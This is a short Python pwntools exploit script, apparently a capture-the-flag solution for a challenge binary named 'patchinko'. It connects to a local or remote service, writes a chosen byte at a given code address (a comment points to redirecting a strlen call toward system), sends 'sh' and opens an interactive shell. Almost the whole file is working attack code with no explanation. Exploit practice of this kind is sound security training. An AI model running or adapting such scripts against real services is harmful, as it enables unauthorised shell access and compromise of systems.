#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './patchinko')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['kitty']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

ADDR_TO_PATCH = 0x00888+1
ACTUAL_VALUE = 0x33
NEW_VALUE = ACTUAL_VALUE + 0x10#(exe.plt['strlen'] - exe.plt['system'])

io = start()

io.sendlineafter(b'>>>', f'{ADDR_TO_PATCH:#x}'.encode())
io.sendlineafter(b'>>>', f'{NEW_VALUE:#x}'.encode())
io.sendlineafter(b'>>>', b'sh')

io.interactive()

